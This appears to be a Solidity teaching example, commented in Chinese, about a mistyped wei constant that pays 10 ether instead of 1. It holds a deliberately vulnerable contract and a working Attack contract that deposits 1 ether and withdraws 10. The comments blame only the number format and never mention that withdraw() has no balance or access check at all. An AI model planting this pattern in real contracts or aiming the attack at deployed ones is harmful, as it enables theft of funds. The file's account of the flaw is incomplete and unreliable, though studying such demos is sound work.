pragma solidity >=0.8.0;
// SPDX-License-Identifier: UNLICENSED

/*
  漏洞：不恰當的數字表示 (Inadequate Data Representation)
  描述：原本預期 credit 為 1 ether，但由於直接用十進位長數字表示，
        容易導致閱讀和審計錯誤，實際上 credit 被設為 10000000000000000000 wei，即 10 ether。
        在這個範例中，使用者僅需存入 1 ether，然而當呼叫 withdraw 函數時，
        合約會依據錯誤的 credit 數值將 10 ether 提款，從而使攻擊者可藉此獲利。

  攻擊流程說明：
   1. 攻擊者使用 Attack 合約向漏洞合約存入 1 ether（deposit 函數要求剛好 1 ether）。
   2. 攻擊者接著呼叫 withdraw 函數，因為 credit 設置錯誤，系統會轉出 10 ether，
      使攻擊者獲得遠超預期額度的 ether。
*/

contract MyContract {
    // 漏洞重點：數值表示不清楚
    // 本來預期 credit 為 1 ether，但因誤寫為 10000000000000000000 (即 10 ether)，
    // 造成後續邏輯轉帳金額過大。
    uint public credit = 10000000000000000000;

    // deposit 函數：要求用戶存入 1 ether
    function deposit() public payable {
        require(msg.value == 1 ether, "Deposit 1 ether exactly");
    }

    // withdraw 函數：會依照 credit 數值轉帳
    // 問題點在於 credit 表示錯誤，導致實際轉帳高達 10 ether
    function withdraw() public {
        payable(msg.sender).transfer(credit);
    }

    // 接收 Ether 的 fallback
    receive() external payable {}
}

// 攻擊合約：利用上述不恰當數值表示，造成攻擊者可以存入 1 ether 後提走 10 ether
contract Attack {
    // 將地址轉型為 payable address 解決編譯錯誤
    MyContract public vulnerableContract;

    // 為了解決從非 payable address 轉成合約的問題，參數型別改為 address，
    // 在轉換時使用 payable()
    constructor(address _vulnerableContract) {
        vulnerableContract = MyContract(payable(_vulnerableContract));
    }

    // 攻擊流程：
    // 1. 發送 1 ether 至 deposit()
    // 2. 呼叫 withdraw() 提取 credit（實為 10 ether）
    function attack() external payable {
        require(msg.value == 1 ether, "Send exactly 1 ether to attack");
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw();
    }

    // 使合約能夠接收轉出來的 Ether
    receive() external payable {}
}
